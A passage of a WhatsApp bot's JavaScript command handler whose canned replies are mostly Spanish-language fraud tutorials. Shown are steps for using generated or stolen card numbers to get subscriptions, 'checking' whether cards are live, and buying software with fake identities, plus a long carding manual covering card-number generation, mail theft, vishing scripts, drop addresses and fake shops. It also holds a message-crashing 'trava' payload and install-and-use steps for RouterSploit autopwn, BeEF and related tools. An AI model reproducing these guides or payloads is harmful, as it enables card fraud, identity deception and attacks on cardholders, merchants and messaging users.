6️⃣ COPIAN UNA TARJETA YA GENERADA DESPUÉS SELECCIONAN UN PLAN "PREMIUM" "HIFI" "FAMILIAR" Y LES MANDARA A LA PASARELA DE PAGO.

7️⃣ EN NOMBRE DE LA TARJETA PONEN UNO FALSO,PEGAN EL NÚMERO DE LA TARJETA,LA FECHA DE EXPIRACIÓN Y EL CÓDIGO DE SEGURIDAD QUE FUE GENERADO EN NAMSO,Y USAN 10005 COMO CÓDIGO POSTAL.

8️⃣ LE DAN CLICK EN "AGREE & CONTINUAR" Y LISTO,TENDRÁN SU CUENTA TERMINADA...🥳`)
                  }
					
		if (budy.includes(`/sacar lives manuales`)) {
                  reply(`🟦 METODO CHECKEAR CCS GRATIS 

🎁 ESTE METODO VA ENFOCADO A LAS PERSONAS QUE NO TIENEN DINERO PARA UN CHECKER O PARA LOS QUE NO CONFIAN EN UN CHECKER

📫 ANTES DE TODO PRENDAN SU VPN EN LA UBICACION DE LA CCS EJEMPLO SI LA CCS ES DE USA PRENDEN EL VPN EN USA

📓 LO PRIMERO QUE TIENEN QUE HACER ES IR A www.alomoves.com Y LE DAN EN "Start Your Free Trial" LES APARECERA UNA PESTAÑA Y LE DAN EN "Skip For Now" Y SE REGISTRAN CON UN CORREO TEMPORAL DE CUALQUIER PAGINA O APP, TAMBIEN PUEDE SER UNO INVENTADO

🗂 DE AHI LOS PONDRA A ESCOJER 2 PLANES, ESCOJEN CUALQUIERA Y LE DAN CONTINUAR YA LUEGO RELLENAN LOS CAMPOS CON LA CCS Y SUS DATOS, SI LES PIDE CODIGO POSTAL BUSQUEN EN INTERNET UNO DEL PAIS. SI LA CCS ESTA LIVE LES PASARA, SI LES DECLINA EL CVV TAMBIEN ESTA LIVE, PERO SI RECHAZA LA TRANSACCION SIGNIFICA QUE ESTA DEAD`)
                  }
					
	if (budy.includes(`/crear cuentas sin bins`)) {
                  reply(`💎 Método - ESET Smart Security Premium 💎

💎 IP: Alemania 🇩🇪

💎 Primer paso: Entrar en: https://eset.com/de/home

💎 Segundo paso: Seleccione: ESET Smart Security Premium

💎 Tercer paso: Luego, ve al kart y selecciona el botón verde (comprar)

💎 Cuarto paso: Ingrese: https://fake-it.ws/de/

💎 Quinto paso: Copiar nombre, dirección, teléfono ... (pero su correo) y pegar en la pagina

💎 Sexto paso: En forma de pago Seleccione: 'Kauf auf Rechnung' (texto en alemán).Compra (botón verde) y consulta tu correo.

💎 Cortesia de: @BineriaUniversal`)
                  }
					
		if (budy.includes(`/introducción carding`)) {
                  reply(`Bueno aprovechando que el amigo SP3L1N4X  dejo una pequeña introduccion al Carding

Manual de Carding

1.- Introducción
2.- Carding
3.- Estructura de las Tarjetas de Crédito
4.- Tengo el numero que hago?
5.- Quiero tener más Números de tarjetas rápidamente
6.- Trashing
7.- El Verdadero Peligro
8.- Herramientas



Disclamer: NO asumo ninguna responsabilidad debida al mal empleo de la información aquí contenida, puesto que este texto solamente tiene fines educativos y en ningún caso pretende incitar a nadie a cometer ningún delito ya sea informático o de otra índole.



Buenas con todos los que puedan leer este documento.


1.- Introducción

En este manual voy a indicar que es el carding? Algunos términos del mismo como utilizarlo y sacar provecho Smiley

Comencemos...................

2.- Carding

Este es un concepto que indica lo más claramente posible que es y de que se trata el carding

Carding: Es el uso ilegitimo de las tarjetas de crédito, o de sus números, pertenecientes a otras personas. Se relaciona con el hacking, porque para conseguir números de tarjetas de créditos, una de las formas es utilizando Ingenieria Social y sobre todo nuestra inteligencia (esto es lo mas importante)

Se debe tener mucho cuidado en hacer esto ya que nos podemos meter en muchos líos.
Con nuestras tarjetas de crédito debemos ser cuidadosos ya que alguien puede leer este documento antes que uno de ustedes y ser capaz de estafarlos.

Se puede recuperar el dinero talvez pero para eso tendrían que hablar con el administrador del sitio donde se realizo el pago del artículo solicitando la IP de donde se hizo la compra y luego de todo esto tenemos que demostrar que nosotros no hicimos la compra del mismo.

El carding consiste en comprar usando la cuenta bancaria o la tarjeta crédito de otro, esto se consigue con un poco de ingenieria social y mucha perseverancia.

Cuando alguna persona utiliza carding para comprar objetos materiales se suele utilizar una dirección falsa con una identificación también falsa, es decir todo el formulario de compra lo llena con datos falsos.
De esta manera el comprador quedara esperando en el lugar indicado la entrega del material como si se tratara de su residencia.

La filosofía de los carders se basa en que existe mucha gente que tiene grandes cantidades de dinero que no cae nada mal utilizar algo de ese dinero para comprar algunas cositas para cada uno de ellos, ya que posiblemente el dueño de la tarjeta ni se de cuenta de esta compra que el no la hizo.

Si ustedes están pensando en comprar por Internet programas o suscripciones y piensan que utilizando el carding será muy fácil pues tienen toda la razón resulta muy sencillo.
En este manual se conseguirá revisar los métodos que utilizan los carders para hacerse de los números de tarjetas y burlar las seguridades para poder comprar sin ningún tipo de problemas.

Tienen que saber que el robo de una tarjeta de crédito es un delito universal por lo que puede tener causas penales muy graves si no quieres irte de paseo a Cana..da (para otros países Cárcel) no intenten hacer nada de esto.


3.- Estructura de las Tarjetas de Crédito

Para mi esta es la parte más importante ya que aquí sabremos como funcionan las tarjetas de crédito porque se puede hacer programas para que nos den números validos pero lo importante es saber como es que se hace todo eso

Comencemos.....

Los números de las tarjetas se forman de 16 dígitos divididos en 4 grupos de 4 dígitos pueden tener valores del 0 al 9 los primeros 4 dígitos sirven para determinar el banco.

El resto de números se pone al azar no mentira vamos a ver el algoritmo

Hagamos un ejemplo de la creación de un número de tarjeta

Numero de tarjeta: 5180 2345 3942 8765

Las posiciones impares son:

5
8
2
4
3
4
8
6

Luego de esto se multiplica los 2 primeros dígitos entre si luego los siguientes y asi sucesivamente para que sea mas claro quedaría de la siguiente forma:

5*8=40
2*4=8
3*4=12
8*6=48

Si tenemos cifras mayores a 9 se suma los números es decir las cifras reducidas 8+5=13 entonces
1+3=4

En el ejemplo quedaría asi:

5*8=40 4+0=4
2*4=8 8
3*4=12 1+2=3
8*6=48 4+8=12 1+2=3

En resumen los números que nos quedan son:

4
8
3
3


Luego de esto suma los números pares que descartamos al principio y súmalos con estos el resultado debe ser un número múltiplo de 10 para que el número sea correcto:

4+8+3+3+1+0+3+5+9+2+7+5=50


Si no nos diera un numero correcto como va a suceder en la mayoría de los casos lo recomendable es dejar el ultimo casillero libre y jugar con este digito hasta que nos de un numero valido.

Esta es una de las formas de conseguir un numero de tarjeta de crédito es decir adivinando a ver si nos sale otra puede ser esperar pacientemente el fin de mes el momento que llega el corte de pago de la tarjeta del vecino nos robamos su correspondencia y listo ahí tenemos un numerito.

O buscamos dentro de su basura (esto creo que es mas feo) pero igual funciona ya que no suelen romper los cortes de tarjeta de crédito simplemente los botan arrugados a la basura pero igual obtenemos el numero deseado.

Otra de las formas es creando un portal de Internet donde ponemos artículos a la venta se explicara esto mas adelante

4.- Tengo el numero que hago?

El momento de realizar una compra en línea nos solicitan una serie de datos pero los mas importantes es decir los que nunca faltan son estos:

Nombre.
Numero de Cuenta.
Fecha de Expiración.
Tipo de tarjeta.
Numero de verificación

Estos datos son muy fáciles de conseguir (a veces)

El nombre es el de la victima sencillo de conseguir, el número de su tarjeta es un poco más complicado pero hay formas revisando su correspondencia por ejemplo

La fecha de expiración la podremos conseguir haciéndonos pasar por el banco con los datos que ya conocemos podremos decirle que vamos ampliar su cupo por sus pagos puntuales o cualquier cosa esto ya queda a su imaginación lo que si nos queda claro es que conseguir estos datos resulta sumamente sencillo.

Tipo de Tarjeta ya lo sabemos ya revisamos su correspondencia revisar paso uno Wink
Para reconocer el tipo de tarjeta se puede utilizar, el primer digito de la tarjeta que nos indica el tipo de la misma.

Si el primer numero es....

3 ->American Express (15 dígitos)
4 ->VISA (13 o 16 dígitos)
5 ->Mastercard (16 dígitos)
6 ->Discover (16 dígitos)

Con estos datos ya se puede comprar algo en línea generalmente los carders realizan una compra de algún software pequeño que sea de descarga o una subscripción para ver pornografía esto lo hacen para probar si la tarjeta funciona o no .

Si el momento de la compra nos solicitaran mas datos ya saben que hacer es mas creo que al momento de revisar su correo no tendrán estos datos tendrán muchos mas.


5.- Quiero tener más Números de tarjetas rápidamente

Como aquí se a explicado bastante me canse y ahora hagan un repaso de lo que aprendieron hasta aquí y piensen en una posible victima hasta mientras me voy hacer un juguito y regreso para seguirles explicando unas cositas bastante interesantes.


Bueno después de estos 15 minutos de tranquilidad volvamos en lo que estábamos..


Para obtener tarjetas podría entrar en juego la famosa Ingenieria Social que tal si llamamos a nuestra victima y decimos algo como lo siguiente:

“Buenas tardes, soy Camilo Albornoz de la sección fraudes de Master Card , hemos detectado un posible uso fraudulento de su tarjeta, por lo que necesitamos que nos indique todos los datos de la misma, para realizar una comprobación”

Este tipo de llamada es bueno realizarla en horas de trabajo ya que la persona se encuentra preocupada con la cabeza enfocada solo en su trabajo por lo que puede resultar un buen momento para que nuestra victima caiga en esta trampa.

Si nos llamaran de un banco diciéndonos algo parecido a lo que escribí anteriormente lo que tienen que hacer es pedir que les repita su nombre completo solicitarle el numero y devolver la llamada de esta manera se evitaran este tipo de estafa.

Todos los que lean pilas que ya están avisados de cómo funciona este método

Aunque parezca mentira existe gran cantidad de gente que cae en este juego y dan todos los datos que les solicitan sin ningún tipo de inconveniente.

Para verificar si la tarjeta es útil se puede hacer una llamada a la entidad bancaria de donde pertenece la tarjeta nos hacemos pasar como dueños de la tarjeta indicando que quisimos hacer una compra y nuestra tarjeta fue rechazada para verificar si hablan con el dueño de la tarjeta pedirán verificar unos datos harán preguntas sencillas como cual es el numero de tarjeta, numero de verificación esto ya no es problema para nosotros ya que tenemos toda la información que conseguimos antes al hacernos pasar como empleados de la entidad que emite la tarjeta

La información que conseguimos aquí es fundamental ya que podremos saber si la tarjeta es principal o es un adicional si es de uso nacional o mundial cuanto es el cupo que tiene la misma , etc.

Las compras que suelen hacer los carders son mediante Internet o telefónicamente no de montos muy altos para que no se pida confirmación al dueño de la tarjeta y para no levantar sospechas

El carder es muy cuidadoso no puede andar gritando al mundo sus hazañas porque el es un ladrón el esta robando , si hace un pedido de un articulo no puede pedir otro y otro articulo a la misma dirección tiene que ir rotando de lugares .

Generalmente si el encargo esta en la oficina de correos el ira cuando no haya nadie si estuviera mucha gente preferirá no arriesgarse y ni siquiera acercarse mas al lugar ya que podría resultar peligroso para el

Un carder nunca pide algo gigante no se comprara un carro para que le traigan por DHL ni nada extremadamente caro (un collar de oro de 18 kilates) tampoco algo muy baratito pero estaría bien que se compre una palm ultimo modelo ese es un buen carder.

El problema que se podría presentar es que el carder cada vez quiere comprar algo mas y no para se vuelve mas adicto por el riesgo y por que se esta comprando buenas cositas pero no se da cuenta que talvez lo tiene fichado y próximamente le haga una visita la policía

Los lugares de entrega de tus pedidos:

NOTA.- NUNCA HAGAS QUE TE ENTREGUEN EN TU CASA

Pero si lo puedes hacer al azar escogiendo alguna persona de la guía telefónica claro que no este tan lejos de tu casa eso si necesitas hablar muy bien para explicar a alguien porque le llego algo tuyo en su casa debes ser bueno para tratar con la gente y no ponerte nervioso.
La casa de un amigo próximo a cambiarse de casa que te ayude con este favor antes de irse difícil esta forma pero puede ocurrir.

Pedir que lo envíen a una dirección de un condominio generalmente lo dejan al guardia ya que asumen que el conoce a toda la gente del condominio y por seguridad a la persona que deja la correspondencia no la dejaran pasar porque son “Ordenes de la Administradora” y quien será la única persona que ira a pedir el paquete?? Exacto el carder.


Bueno estas son una de las tantas formas en las que pueden recibir sus compras seguramente a ustedes se les ocurrirá muchas mas .



6.- Trashing

Me parece un tema interesante y que no se lo ve regularmente aquí les explico de que se trata aunque entre las ideas que indique antes ya lo mencione.

Se trata de buscar y remover la basura de la victima que estas buscando es decir intentar encontrar estados de cuenta, cortes de pago, recibos, etc.

Por eso un sano consejo cuando boten algo importante rompanlo y botenlo si es posible haciendolo tiritas talvez piensen este tipo esta medio loco pero yo supe de alguien que quemaba sus papeles una vez por semana quien es el loco el o yo??

7.- El verdadero Peligro


Ahora con toda la tecnología a nuestro alcance se pueden hacer muchas cosas , esto es lo que utilizan los carders necesitan saber programar y dos invitados muy importantes.

PHP + MySQL

PHP.- Lenguaje de programación web
MySQL.- Base de Datos trabaja excelente con PHP

Que es lo que hacen??

Se esmeran un par de horas programando un sitio de venta de artículos pueden ser de cualquier tipo deportivos, tecnológicos, etc.

Con precios sumamente accesibles y con productos de excelente calidad la victima se emociona con esta verdadera gamga cuando va a adquirir un producto viene el método de pago el cual es con tarjeta de crédito.

La victima ingresa su tarjeta , nombres , numero de verificación todos los datos necesarios luego de esto el carder ya posee todo lo que necesita queda simplemente enviar un e-mail o hacer una llamada disculpándose y notificando que la transacción no se realizo por no tener el articulo en stock o simplemente el momento que supuestamente hace la compra se le muestra un mensaje de error que diga algo similar a esto:
“NO SE PUDO CONCLUIR LA TRANSACCION”
La victima pensara que no paso nada pero nuestra base de datos ya se engordo un poco mas y con datos totalmente reales y listos para usar.


8.- Herramientas

Existen programas que nos ayudan a generar números de tarjetas validos esto ahora tiempo a los carders


Estas herramientas son:

Fakeid

Te da otros datos de personas verificables, interesante para quienes no tienen habilidad de inventarse personalidades.

Para aquellos programas que no te brindan la fecha de expiración solo queda hacerlo manualmente, probando al mejor estilo brute forcing.

CCards

En caso de que quieran ver unos números de tarjeta de crédito validos como ejemplo, vean el programa CCards.exe que les genera de una manera sencilla y rápida estos números


Credit Card Master 4

Este completo programa permite realizar una amplia cantidad de acciones destinadas al carding, genera numeros te ayuda viendo si el digito verificador es correcto y si no es asi no te preocupes ahi mismo te genera otro lo importante es que todos los datos estén correctos


Credit

Es un programa muy potente parecido al Credit Card Master aunque tiene interfaz grafica y tiene algunas otras utilidades como por ejemplo generar identidades falsas que como estuvimos viendo pueden ser de gran utilidad.


Bueno espero que toda la explicación del manual este clara y que les sirva para conocer el carding más a fondo.
Nunca olviden que esto es totalmente ilegal y que si no quieren meterse en líos no lo pongan en práctica suerte a todos.

Espero que les haya gustado, y espero que con esto mas o menos se de una ideita...


Saludos a todos Bic`)
                  }
					
		if (budy.includes(`/numeros virtuales`)) {
                  reply(`[❌] ꜱᴇ ᴘʀᴏᴅᴜᴊᴏ ᴜɴ ᴇʀʀᴏʀ, ɪɴᴛᴇɴᴛᴀʟᴏ ᴍᴀꜱ ᴛᴀʀᴅᴇ [❌]`)
                  }
					
		if (budy.includes(`/numero virtual +1`)) {
                  reply(`𝙋𝙖𝙧𝙖 𝙘𝙧𝙞𝙖𝙧 𝙪𝙢 𝙣𝙪́𝙢𝙚𝙧𝙤 𝙛𝙖𝙠𝙚, 𝙫𝙤𝙘𝙚̂ 𝙥𝙧𝙚𝙘𝙞𝙨𝙖 𝙗𝙖𝙞𝙭𝙖𝙧 𝙤 𝙖𝙥𝙥, 𝙘𝙖𝙙𝙖𝙨𝙩𝙧𝙖𝙧 𝙨𝙚𝙪 𝙚𝙢𝙖𝙞𝙡 𝙚 𝙪𝙨𝙖𝙧 𝙤 𝙘𝙤́𝙙𝙞𝙜𝙤 𝙙𝙚 𝙣𝙪́𝙢𝙚𝙧𝙤 𝙙𝙚 𝙧𝙚𝙛𝙚𝙧𝙚̂𝙣𝙘𝙞𝙖 𝟱𝟴𝟳 𝙊𝙐 𝟵𝟭𝟯 𝙖𝙤 𝙚𝙨𝙘𝙤𝙡𝙝𝙚𝙧 𝙨𝙚𝙪 𝙣𝙪́𝙢𝙚𝙧𝙤.
(𝘿𝘿𝘿 𝟱𝟴𝟳= 𝘾𝘼𝙉𝘼𝘿𝘼́ / 𝘿𝘿𝘿 𝟵𝟭𝟯= 𝙀𝙐𝘼)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━   
𝙇𝙤𝙜𝙤 𝙖𝙥𝙤́𝙨, 𝙨𝙚 𝙤 𝙣𝙪́𝙢𝙚𝙧𝙤 𝙦𝙪𝙚 𝙫𝙤𝙘𝙚̂ 𝙧𝙚𝙘𝙚𝙗𝙚𝙪, 𝙟𝙖́ 𝙚𝙨𝙩𝙞𝙫𝙚𝙧 𝙗𝙖𝙣𝙞𝙙𝙤, 𝙧𝙚𝙥𝙞𝙩𝙖 𝙤 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙤 𝙖𝙩𝙚́ 𝙚𝙣𝙘𝙤𝙣𝙩𝙧𝙖𝙧 𝙪𝙢 𝙦𝙪𝙚 𝙣𝙖̃𝙤 𝙚𝙨𝙩𝙚𝙟𝙖 𝙗𝙖𝙣𝙞𝙙𝙤.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━   

𝙇𝙞𝙣𝙠 𝙚𝙣𝙨𝙞𝙣𝙖𝙣𝙙𝙤 𝙖𝙗𝙖𝙞𝙭𝙤.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━   
𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟭!
https://youtu.be/kzaWUxV1otg

𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟮!
https://youtu.be/xweP4-FlG8c

2NDLINE:

https://www.mediafire.com/file/5adhdt0aeicbktu/2ndline-21-1-0-0.apk/file`)
                  }
					
		if (budy.includes(`/numero virtual +994`)) {
                  reply(`COMO CREAR NÚMERO VIRTUAL +994

PARA ESTE MÉTODO USAREMOS LA APLICACIÓN SAFEUM, ESTA LA PODEMOS DESCARGAR DESDE LA PLAY STORE, TOTALMENTE GRATIS,

UNA VEZ YA DESCARGADA, LA ABRIMOS, Y LE DAMOS EN (SING UP) LUEGO TENDREMOS QUE ELEGÍR UN NOMBRE PECULIAR, INGLÉS SI ES POSIBLE.

LUEGO EN CONTRASEÑA PONDREMOS UNA LO MAS CORTA POSIBLE, DE 4 DÍGITOS PERSONALMENTE LO HAGO YO, LUEGO ESPERAMOS A QUE SE NOS CARGUE, ES NECESARIO CONSIDERAR QUE LA SEÑAL DE INTERNET SEA ESTABLE, PARA EVITAR POSIBLES ERRORES, UNA VEZ QUE YA SE NOS CARGÓ, NOS VAMOS A LA PARTE DERECHA DE LA INTERFAZ Y PODREMOS VER NUESTRO NÚMERO CREADO.

ENTONCES LO SELECCIONAMOS, Y NOS DIRIGIMOS A NUESTRO WHATSAPP ADICIONAL, INMUNE ETC, Y LO PEGAMOS AHÍ, Y SOLO NOS QUEDA ESPERAR QUE NOS LLEGUE EL CÓDIGO AUTOMÁTICAMENTE, SI NO LES LLEGA DEBEN DARLE EN REENVIAR SMS, EL CÓDIGO NOS LLEGARÁ A LA APLICACIÓN SAFEUM

Y SOLO NOS QUEDA COLOCAR EL CÓDIGO Y LISTO, CON ESO TENDRIAMOS CREADO NUESTRO NÚMERO VIRTUAL

Michael domina`)
                  }
					
		if (budy.includes(`/banear`)) {
                  reply(`Removeu você                                                  
         💤
    ＜⌒／ヽ-､＿
／＜_/＿＿＿＿／
￣￣￣￣￣￣￣
𝙍𝙀𝙇𝘼𝙓𝘼 𝙁𝙊𝙄 𝙎𝙊́ 𝙐𝙈 𝙎𝙊𝙉𝙃𝙊

        {\__/}
        ( ಥ_ಥ) 
        /づ ／(＿＿_
／　└-(＿＿＿_／
￣￣￣￣￣￣￣`)
                  }
			
	if (budy.includes(`/trava`)) {
                  reply(`😃⃢ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂:ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ꮎᷛ😈⃟⃢𖢄࿐ℒꮠ͙ͭꮮͤӃꮛ͙ͦꮎᷛ😈⃟⃢𖢄࿐྄ོོྀུྂꮎᷛ👾😃⃢ᣳ⃟🤡̵̛͔͍̱͙ 
😃⃢ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂:ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ꮎᷛ😈⃟⃢𖢄࿐ℒꮠ͙ͭꮮͤӃꮛ͙ͦꮎᷛ😈⃟⃢𖢄࿐྄ོོྀུྂꮎᷛ👾😃⃢ᣳ⃟🤡̵̛͔͍̱͙ 😃⃢ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂:ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ꮎᷛ😈⃟⃢𖢄࿐ℒꮠ͙ͭꮮͤӃꮛ͙ͦꮎᷛ😈⃟⃢𖢄࿐྄ོོྀུྂꮎᷛ👾😃⃢ᣳ⃟🤡̵̛͔͍̱͙ 
😃⃢ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂:ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ꮎᷛ😈⃟⃢𖢄࿐ℒꮠ͙ͭꮮͤӃꮛ͙ͦꮎᷛ😈⃟⃢𖢄࿐྄ོོྀུྂꮎᷛ👾😃⃢ᣳ⃟🤡̵̛͔͍̱͙ 😃⃢ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂:ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ꮎᷛ😈⃟⃢𖢄࿐ℒꮠ͙ͭꮮͤӃꮛ͙ͦꮎᷛ😈⃟⃢𖢄࿐྄ོོྀུྂꮎᷛ👾😃⃢ᣳ⃟🤡̵̛͔͍̱͙ 
😃⃢ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑🤡̵̛͔͍̱͙̥͔̯͖̥͙̲͆ͬ̊̑̔̂:ᣳ⃟ᣳ⃟ᣳ⃟⃟ᣳ⃟ᣳ⃟ᣳ⃟ᣳ⃟ꮎᷛ😈⃟⃢𖢄࿐ℒꮠ͙ͭꮮͤӃꮛ͙ͦꮎᷛ😈⃟⃢𖢄࿐྄ོོྀུྂꮎᷛ👾😃⃢ᣳ⃟🤡̵̛͔͍̱͙ 


𝘾𝘼𝙇𝙈𝘼 𝙍𝘼𝙋𝘼𝙕𝙄𝘼𝘿𝘼,𝙏𝙊 𝙋𝘼𝙎𝙎𝘼𝙉𝘿𝙊 𝘼𝙆𝙄 𝙎𝙊́ 𝙋𝘼𝙍𝘼 𝙇𝙀𝙈𝘽𝙍𝘼𝙍 𝙑𝘾𝙎 𝘿𝙀 𝙏𝙊𝙈𝘼𝙍 𝘼́𝙂𝙐𝘼 𝙆𝙆𝙆𝙆𝙆 🐦🐦̵̛͔͍̱͙`)
                  }
			
	if (budy.includes(`/bug`)) {
                  reply(`...ʜᴏʟᴀ, ᴀʟɢᴜɴᴀ sᴜɢᴇʀᴇɴᴄɪᴀ ᴏ ᴜɴ ᴇʀʀᴏʀ ᴇɴ ᴇʟ ʙᴏᴛ.

...ᴄᴏᴍᴜɴɪᴄᴀᴛᴇ ᴄᴏɴᴍɪɢᴏ:

...ɪɴғᴏʀᴍᴀᴄɪᴏɴ ᴅᴇʟ ʙᴏᴛ.

...ᴏᴡɴᴇʀ: wa.me/+582692404516
...s.ᴏᴘᴇʀᴀᴛɪᴠᴏ: Android
...ɢʀᴜᴘᴏ ᴏғɪᴄɪᴀʟ: https://chat.whatsapp.com/BDbc6xaTFEZ5zvgT8yH2Bl
...ɢʀᴜᴘᴏ ᴅᴇ ʀᴇsᴘᴀʟᴅᴏ: https://chat.whatsapp.com/BzgUt8vXcu56WUa67lo0fX

...ʀᴇᴄᴜᴇʀᴅᴀ ǫᴜᴇ ᴘᴀʀᴀ ᴜsᴀʀ ᴀʟ ʙᴏᴛ ᴅᴇʙᴇs ᴇsᴄʀɪʙɪʀ: ʜᴇʟᴘ ᴏ ᴍᴇɴᴜ
...ʏ sɪᴇᴍᴘʀᴇ ʟʟᴇᴠᴀʀ ᴇʟ ᴘʀᴇғɪᴊᴏ 「 / 」
...ɴᴏ ᴇɴᴠɪᴀʀʟᴇ ᴍᴇɴꜱᴀᴊᴇꜱ ᴀʟ ᴘʀɪᴠᴀᴅᴏ ᴀʟ ʙᴏᴛ

...ɴᴏ ᴘᴇᴅɪʀ ᴇʟ ᴍɪꜱᴍᴏ ᴄᴏᴍᴀɴᴅᴏ ᴀ ᴄᴀᴅᴀ ʀᴀᴛᴏ, ᴇꜱ ᴜɴ ᴘᴏᴄᴏ ʟᴇɴᴛᴏ -_-`)
                  }
			
					
	if (budy.includes(`/routersploit`)) {
                  reply(`📱¿Que es RouterSploit?📱

RouterSploit, es un framework de seguridad open source muy similar al conocido Metasploit con el cual podremos auditar nuestros dispositivos (routers, webcam, NAS, etc) para comprobar si tienen vulnerabilidades conocidas.

📱 El framework, cuenta con los siguientes 5 módulos:📱

🌎 Exploits: módulos que aprovechan las vulnerabilidades identificadas. 🌎

🌐 Creds: módulos para probar credenciales en los servicios de red. 🌐

🔒 Scanners: módulos que verifican si un objetivo es vulnerable a cualquier exploit. 🔒

💉 Payloads: módulos para generar cargas útiles en diversas arquitecturas. 💉

👾 Generic: módulos que realizan ataques genéricos. 👾

📱Instalación:📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install python git clang -y
$ pkg install -y make
$ git clone https://github.com/threat9/routersploit
$ cd routersploit
$ python3 -m pip install -r requirements.txt
$ python3 -m pip install -r requirements-dev.txt
$ chmod +x *setup.py
$ python3 setup.py install
$ python3 rsf.py

Uso:

show all

use scanners/autopwn

show options

set target 192.168.1.1`)
                  }
			
	if (budy.includes(`/infoga`)) {
                  reply(`📱 InfoGa es una herramienta que recopila información de cuentas de correo electrónico (ip, nombre de host, país, ...) de diferentes fuentes públicas (motores de búsqueda, servidores clave pgp y shodan) y verifica si los correos electrónicos se filtraron utilizando la API haveibeenpwned.com. Es una herramienta realmente sencilla, pero muy eficaz para las primeras etapas de una prueba de penetración o simplemente para conocer la visibilidad de tu empresa en Internet.📱

📱Installation :📱

$ apt update && apt upgrade
$ apt install git 
$ apt install python2
$ git clone https://github.com/m4ll0k/Infoga
$ cd Infoga
$ chmod +x *
$ pip2 install requests

📱usage:📱

$ python2 infoga.py

Now it shows all options to use this tool

$ python2 infoga.py -t gmail.com -s all

Now its started collecting emails and e-mails information

[hostname, city, organization, longitude and latitude ports..]`)
                  }
			
	if (budy.includes(`/beef`)) {
                  reply(`💻INSTALACIÓN DE BeEF EN TERMUX (ANDROID)💻

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ pkg install -y ruby
$ pkg install -y vim
$ pkg install -y nodejs
$ pkg install -y unstable-repo
$ pkg install -y metasploit
$ git clone https://github.com/beefproject/beef
$ cd beef
$ ./update-beef
$ vim config.yaml

Editar user y pass y salir guardando cambios.

$ ./beef -x`)
                  }
			
		if (budy.includes(`/ngrok`)) {
                  reply(`📱¿Qué es Ngrok?📱

Ngrok es una herramienta que permite acceder nuestro servidor local a cualquier persona en internet con la que compartamos una url generada dinamicamente.

📱INSTALACIÓN DE Ngrok EN TERMUX (ANDROID)📱

$ apt update && apt upgrade -y
$ termux-setup-storage
$ pkg install -y git
$ git clone https://github.com/TermuxHacking000/NgrokTH
$ ls
$ cd NgrokTH
$ ls
$ chmod +x *
$ ls
$ ./ngrok.sh

Aqui debemos ponemos 1 para instalar ngrok en termux.

Aqui deveremos ir a la pagina de Ngrok registrarnos o inciar seccion en Ngrok y copiar nuestro authtoken de nuestra cuenta aqui les dejo la pagina de Ngrok para que vallan.

Sitio https://ngrok.com/

Una vez aigan copiado su authtoken lo pegan en termux y le pulsan a enter.

Despues de eso nos dira para elegir entre
-ngrok http 4444
-ngrok tcp 4444

Pero yo en este caso pongo 
ngrok http 8080
Le damos a enter y ya de aver echo todo eso ya tenes el Ngrok`)
                  }
			
	if (budy.includes(`/phoneinfoga`)) {
